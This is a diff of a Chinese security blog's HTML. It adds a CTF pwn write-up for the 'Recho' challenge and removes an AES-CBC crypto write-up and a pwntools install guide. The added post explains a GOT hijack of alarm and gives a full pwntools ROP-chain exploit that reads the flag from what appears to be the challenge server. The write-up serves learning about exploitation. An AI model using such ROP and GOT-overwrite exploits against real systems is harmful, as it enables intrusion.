+<p> 网上有些大佬们都去找 flag 的时候 shift F12 一按就有了，而我…</p>
+<p> <img src="/../images/Recho/image-20230731125610315.png" alt="image-20230731125610315"></p>
+<p>flag  呢？我都怀疑是不是同一个题目…. </p>
+<p>结果在导出表里（export)</p>
+<p><img src="/../images/Recho/image-20230731125657760.png" alt="image-20230731125657760"></p>
+<p> 好了又回到同一起点了</p>
+<p> 这里面最重要的是实现 got 表劫持和 ROP 链的实现，利用 open()这一系统函数远程打开 flag 文件， 而不是夺取 shell 权限：</p>
+<p> 为什么会想到这个呢，可能时看到了 flag 字段的出现，但没有 system 函数这一类，想到了远程打 开文件这样把..（就当作公式吧） </p>
+<p>整体思路： 先把 alarm 的 got 表修改一下，改成 open（）打开 flag 文件，然后读取在 bss 段上，利用 printf 或 write 打在屏幕上（改 alarm 因为他没用。。）， </p>
+<p>注：选 bss 段是因为 bss 段的可读可执行功能，bss 段可以自己去 ida 的页面上去搜，随便找 一段就好了（尽量长一点）。</p>
+<p> 这里我们会发现一个知识点，这些 Libc.so 里的系统函数都有 syscall 这一调用这一函数，并且 eax 存放序列号。</p>
+<p> gdb 调试，r 运行，再按 ctrl c 强行停止，在用 disass alarm看下反汇编</p>
+<p> <img src="/../images/Recho/image-20230731125900115.png" alt="image-20230731125900115"></p>
+<p> alarm 序列号为 0x25，并且我们可以看到 syscall 与起点 mov eax 的偏移量为 5。（这是 重点！） 然后我们要去找 open 的序列号</p>
+<p>这里附上查找链接(68 条消息) Linux 系统调用表(system call table),然后 open 序列号你知道了，现在只需要完成 alarm got 表的修改，那怎么 改呢? 网上大佬们都很牛皮的说靠经验更改了一段这个….</p>
+<p>alarm 序列号为 0x25，并且我们可以看到 syscall 与起点 mov eax 的偏移量为 5。（这是重点！）</p>
+<p>然后我们要去找 open 的序列号</p>
+<p>这里我是在网上搜的 Linux 系统调用库，因为我 gdb 调出来的不是 2，我也不清楚为什么..不知道其他兄弟们怎么样。附上查找链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/Rong_Toa/article/details/109826240">(68 条消息) Linux 系统调用表(system</a> call table)_rtoax 的博客-CSDN 博客_系统调用表</p>
+<p>然后 open 序列号你知道了，现在只需要完成 alarm got 表的修改，那怎么改呢?</p>
+<p>用 ROPgadget 找了一下…..</p>
+<p><img src="/../images/Recho/clip_image015.jpg" alt="img"></p>
+<p>这一段的作用是吧 rdi 里的值作为地址，指向的数值加上 al 里的值。</p>
+<p>所以我们可以把 alarm 的 got 表地址放在 rdi 里，然后把偏移量 5 放到 rax 里，我们就实现了把 alarma 的调用改成了 syscall 的调用。</p>
+<p>好了最难的已经过去了，现在就是一大串的 ROP 链实现：</p>
+<p> POPADD 即实现上图红线功能，劫持 got 表POPrax 把值弹到 rax 里，其他的以此类推。</p>
+<p>注意特别的是 POPrsi 是 POP RSI,POP R15,所以后面加了两个 p64()。（ROPgadget 里只有这个兄弟们可以自己试试）</p>
+<p>pay &#x3D; b’a’*0x38+ p64(POPrax)+p64(5)+p64(POPrdi)+p64(alarm_got)+p64(POPADD)</p>
+<p>0x38 填充到返回地址，然后后把 5 弹到 RAX,alarm got 表弹到 RDI,后面接 POPADD 实现 GOT</p>
+<p>表劫持</p>
+<p>Pay   +&#x3D;   p64(POPrdi)+p64(flag)+p64(POPrsi)+p64(0)+p64(0)+   p64(POPrax)   +   p64(2)      +</p>
+<p>p64(alarm_plt)  调用 open 函数(0,flag)</p>
+<p>Pay +&#x3D; p64(POPrdi)+p64(3)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(read_plt)</p>
+<p>调用 read 函数（3,buf,200) 3 是默认的，200 为读取 200 字节</p>
+<p>pay +&#x3D; p64(POPrdi)+p64(1)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(write_plt)</p>
+<p>调用 write 函数（1,buf,200）1 为默认值，200 为往屏幕上写 200 字节</p>
+<p>至此 ROP 链构建完成，展示全部代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./f&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">50861</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=elf.bss()</span><br><span class="line">pop_rdi=<span class="number">0x4008a3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4008a1</span></span><br><span class="line">pop_rdx=<span class="number">0x4006fe</span></span><br><span class="line">pop_rax=<span class="number">0x4006fc</span></span><br><span class="line">add_rdi_al=<span class="number">0x40070d</span></span><br><span class="line">flag=<span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">alarm_plt=elf.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_got=elf.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=<span class="number">0x38</span></span><br><span class="line">pay=<span class="string">b&#x27;a&#x27;</span>*offset+p64(pop_rax)+p64(<span class="number">5</span>)+p64(pop_rdi)+p64(alarm_got)+p64(add_rdi_al)</span><br><span class="line">pay+=p64(pop_rdi)+p64(flag)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(alarm_plt)</span><br><span class="line">pay+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">100</span>)+p64(read_plt)</span><br><span class="line">pay+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">100</span>)+p64(write_plt)</span><br><span class="line">pay.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x200</span>))</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recv()</span><br><span class="line">p.shutdown(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>#got change</p>
+<p>pay   +&#x3D;   p64(POPrdi)+p64(flag)+p64(POPrsi)+p64(0)+p64(0)+   p64(POPrax)   +   p64(2)      +</p>
+<p>p64(alarm_plt)    #open use</p>
+<p>pay +&#x3D; p64(POPrdi)+p64(3)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(read_plt) #read use</p>
+<p>pay +&#x3D; p64(POPrdi)+p64(1)+p64(POPrsi)+p64(bss)+p64(0)+p64(POPrdx)+p64(200)+p64(write_plt)</p>
+<p>p.recvuntil(“server!”)</p>
+<p>p.sendline(str(0x200))  &#x2F;&#x2F;atoi()函数是将字符串变为数字，所以我们这里输一个大一点的满足溢出条件</p>
+<p>pay.ljust(0x200,b’\0’)   &#x2F;&#x2F;补齐 payload p.sendline(pay)</p>
+<p>p.recv()</p>
+<p>p.shutdown(‘send’)     &#x2F;&#x2F;跳出循环p.interactive()</p>
+<p>p.close()</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -810,399 +1215,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/10/AES-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/10/AES-1/" class="post-title-link" itemprop="url">AES-1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-10 17:40:45 / 修改时间：17:43:34" itemprop="dateCreated datePublished" datetime="2023-07-10T17:40:45+08:00">2023-07-10</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/crypto/" itemprop="url" rel="index"><span itemprop="name">crypto</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="2020年第三届安洵杯-easyaes-writeup"><a href="#2020年第三届安洵杯-easyaes-writeup" class="headerlink" title="[2020年第三届安洵杯] easyaes writeup"></a>[2020年第三届安洵杯] easyaes writeup</h1><h4 id="转载"><a href="#转载" class="headerlink" title="转载"></a>转载</h4><p>本题是2020年第三届安洵杯的一个题目，当时也是我当时费了好长时间时间才做出来的一个题，题目对AES-CBC的加密流程考察的很清晰</p>
-<p>Task:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">l</span>):</span><br><span class="line">    <span class="keyword">return</span> random.getrandbits(l)</span><br><span class="line"></span><br><span class="line">iv = flag.strip(<span class="string">b&#x27;flag&#123;&#x27;</span>).strip(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">16</span>)])</span><br><span class="line">LENGTH = <span class="built_in">len</span>(key)</span><br><span class="line"><span class="keyword">assert</span> LENGTH == <span class="number">16</span></span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">4</span>) * <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(hint)^bytes_to_long(key))</span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypto</span>(<span class="params">message</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.hexlify(encrypto(msg))[-<span class="number">32</span>:])</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line"><span class="string">bc03f3ac4ff8064acbcfaf0b0bf2ba7b</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="0x10-题目分析以及加密流程分析"><a href="#0x10-题目分析以及加密流程分析" class="headerlink" title="0x10 题目分析以及加密流程分析"></a>0x10 题目分析以及加密流程分析</h2><p>在完成题目之前，我们要先学习什么是AES-CBC, 以及他的加密解密流程</p>
-<p><img src="/../images/AES-1/3fe5922bcfbc1187cc5cb2609e344c3c.png" alt="image"></p>
-<p>Plaintext：明文数据</p>
-<p>IV：初始向量</p>
-<p>Key：分组加密使用的密钥</p>
-<p>Ciphertext：密文数据</p>
-<blockquote>
-<p>明文都是先与混淆数据（第一组是与IV，之后都是与前一组的密文）进行异或，再执行分组加密的。</p>
-<p>1、首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。<br>2、生成一个随机的初始化向量(IV)和一个密钥。<br>3、将IV和第一组明文异或。<br>4、用密钥对3中xor后产生的密文加密。<br>5、用4中产生的密文对第二组明文进行xor操作。<br>6、用密钥对5中产生的密文加密。<br>7、重复4-7，到最后一组明文。<br>8、将IV和加密后的密文拼接在一起，得到最终的密文。</p>
-</blockquote>
-<p>解密过程：<br>每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。</p>
-<blockquote>
-<p>对于第一组则是与IV进行异或。</p>
-<p>1、从密文中提取出IV，然后将密文分组。<br>2、使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>3、使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>4、重复2-3，直到最后一组密文。</p>
-</blockquote>
-<p>根据这个加密流程我们可以得到</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">假设aes 加密函数为enc(msg,key),初始向量为iv,key = key, 则其加密流程大致为:</span><br><span class="line">enc1 = enc(msg[<span class="number">0</span>]^ iv ,key)</span><br><span class="line">enc2 = enc(msg[<span class="number">1</span>]^enc(msg[<span class="number">0</span>]^ iv ,key),key)</span><br><span class="line">enc3 = enc(msg[<span class="number">2</span>]^enc(msg[<span class="number">1</span>]^enc(msg[<span class="number">0</span>]^ iv ,key),key),key)</span><br><span class="line">enc4 = enc(msg[<span class="number">3</span>]^enc(msg[<span class="number">2</span>]^enc(msg[<span class="number">1</span>]^enc(msg[<span class="number">0</span>]^ iv ,key),key),key),key)</span><br><span class="line">final_enc = enc1+enc2+enc3+enc4</span><br></pre></td></tr></table></figure>
-
-<p>而由于题目中所给出的hint长度与key长度不一样，导致我们可以推出hint，从而恢复出key</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>,<span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br></pre></td></tr></table></figure>
-
-<p>而此时我们已经有的信息包括</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enc4</span><br><span class="line">key</span><br><span class="line">msg[<span class="number">0</span>],msg[<span class="number">1</span>],msg[<span class="number">2</span>],msg[<span class="number">3</span>]</span><br></pre></td></tr></table></figure>
-
-<p>我们要通过这些已知量求出初始向量</p>
-<p>解密图：</p>
-<p><img src="/../images/AES-1/6a5275cc8395c042fe7f8fc41fcc6312.png" alt="image-20210811141323359"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">假设aes 解密函数为decrypt(enc,key),初始向量为iv,key = key, 则其解密流程大致为:</span><br><span class="line">msg[<span class="number">0</span>] = decrypt(enc1,key)^iv</span><br><span class="line">msg[<span class="number">1</span>] = decrypt(enc2,key)^enc1</span><br><span class="line">msg[<span class="number">2</span>] = decrypt(enc3,key)^enc2</span><br><span class="line">msg[<span class="number">3</span>] = decrypt(enc4,key)^enc3</span><br><span class="line">msg = msg[<span class="number">0</span>]+msg[<span class="number">1</span>]+msg[<span class="number">2</span>]+msg[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">而我们已经有enc4,key,msg[<span class="number">0</span>],msg[<span class="number">1</span>],msg[<span class="number">2</span>],msg[<span class="number">3</span>],因此:</span><br><span class="line">enc3 = decrypt(enc4,key)^msg[<span class="number">3</span>]</span><br><span class="line">enc2 = decrypt(enc3,key)^msg[<span class="number">2</span>]</span><br><span class="line">enc1 = decrypt(enc2,key)^msg[<span class="number">1</span>]</span><br><span class="line">iv = decrypt(enc1,key)^msg[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
-
-<p>从而恢复出初始向量</p>
-<h2 id="0x20-POC"><a href="#0x20-POC" class="headerlink" title="0x20 POC"></a>0x20 POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"><span class="keyword">import</span> binascii, sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="comment"># -----------get key---------</span></span><br><span class="line"></span><br><span class="line">tmp = <span class="number">99748265546679089946917295913637945222843938798184123305418691873367322323659</span></span><br><span class="line">hint = <span class="built_in">int</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(tmp))[<span class="number">2</span>:<span class="number">10</span>] * <span class="number">8</span>,<span class="number">16</span>)</span><br><span class="line">key = long_to_bytes(tmp ^ hint)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ----------get iv-----------</span></span><br><span class="line">msg = <span class="string">b&#x27;Welcome, ctfer. Dont try too hard, its no use. Have a good day!!&#x27;</span></span><br><span class="line">msgs = [msg[ii:(ii+<span class="number">16</span>)] <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(msg),<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> msgs</span><br><span class="line"></span><br><span class="line">msgs.reverse()</span><br><span class="line">IV = binascii.unhexlify(<span class="string">&#x27;bc03f3ac4ff8064acbcfaf0b0bf2ba7b&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decry</span>(<span class="params">key,IV,ms</span>): </span><br><span class="line">    aes=AES.new(key,AES.MODE_ECB) </span><br><span class="line">    <span class="keyword">return</span> strxor(aes.decrypt(IV),ms)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> ms <span class="keyword">in</span> msgs:</span><br><span class="line">    IV=decry(key,IV,ms)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;flag&#123;&#x27;</span> + IV+ <span class="string">b&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/29/python2%E5%AE%89%E8%A3%85pwntools/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/06/29/python2%E5%AE%89%E8%A3%85pwntools/" class="post-title-link" itemprop="url">python2安装pwntools</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-06-29 20:27:55 / 修改时间：20:28:43" itemprop="dateCreated datePublished" datetime="2023-06-29T20:27:55+08:00">2023-06-29</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>因为最近开始学习<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=pwn&spm=1001.2101.3001.7020">pwn</a>，我写的脚本需要再python2环境下运行，而pwn库安装在python3，所以需要在python2下载pwntools，过程中遇到了许多问题，特此记录下来方便后续查看</p>
-<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
-<li><ul>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62621015/article/details/130156312#_3">本地环境</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62621015/article/details/130156312#python2python3pip3_15">安装python2,python3,pip3</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62621015/article/details/130156312#pip2_41">安装pip2</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62621015/article/details/130156312#pwntools_57">安装pwntools</a></li>
-<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62621015/article/details/130156312#_109">番外：</a></li>
-</ul>
-</li>
-</ul>
-<h2 id="本地环境"><a href="#本地环境" class="headerlink" title="本地环境"></a>本地环境</h2><p>kali版本<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/5b6acdb9011c4bc9b69dcf0d18897833.png" alt="在这里插入图片描述"></p>
-<p>我的kali原本就自带了<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=python2&spm=1001.2101.3001.7020">python2</a>和python3，python默认软连接到python3，pip也是pip3，没有pip2<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/bc1bf4ed4c6b4f86b8c4db0f0f63af4d.png" alt="在这里插入图片描述"></p>
-<p><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/cc2bd73f9b7f4bcd9d5212580536ca21.png" alt="在这里插入图片描述"><br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/9ef67b36bccb4770803b2970367c5cf3.png" alt="在这里插入图片描述"></p>
-<h2 id="安装python2-python3-pip3"><a href="#安装python2-python3-pip3" class="headerlink" title="安装python2,python3,pip3"></a>安装python2,python3,pip3</h2><p>没有python3的话可以直接使用apt安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python3</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>python2也是一样</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python2</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>pip3也可以使用apt命令安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> apt-get install python3-pip</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>或者使用以下命令，第二行的python为python3</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</span><br><span class="line">python get-pip.py --force-reinstall</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装pip2"><a href="#安装pip2" class="headerlink" title="安装pip2"></a>安装pip2</h2><p>但是pip2用上述方法以及无法下载<br>需要使用以下方法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
-
-<p>如果安装过程报错可以尝试安装python-dev</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install python-dev</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=pwntools&spm=1001.2101.3001.7020">pwntools</a></h2><p>接下来是pwntools<br>安装相关依赖库（这步我不确定是不是一定需要）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl-dev libffi-dev build-essential</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>安装pwntools</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pwntools</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>若安装过程中报错如下图</p>
-<blockquote>
-<p>error: invalid command ‘egg_info’</p>
-</blockquote>
-<p><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/ffdab888430441499afbf23940c5aa81.png" alt="在这里插入图片描述"><br>可以尝试以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip2 install --upgrade pip setuptools</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>再重新安装</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m pip install --upgrade pwntools</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>安装成功<br><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/340cc26328404da99e8e8e56725fd4ae.png" alt="在这里插入图片描述"></p>
-<p>测试</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python2</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="number">12</span></span><br></pre></td></tr></table></figure>
-
-<p>发现报错</p>
-<blockquote>
-<p>No module named pathlib2</p>
-</blockquote>
-<p><img src="/../images/python2%E5%AE%89%E8%A3%85pwntools/9e311e1ad87e4d0ea13a0ef25ee0774f.png" alt="在这里插入图片描述"><br>安装此module</p>
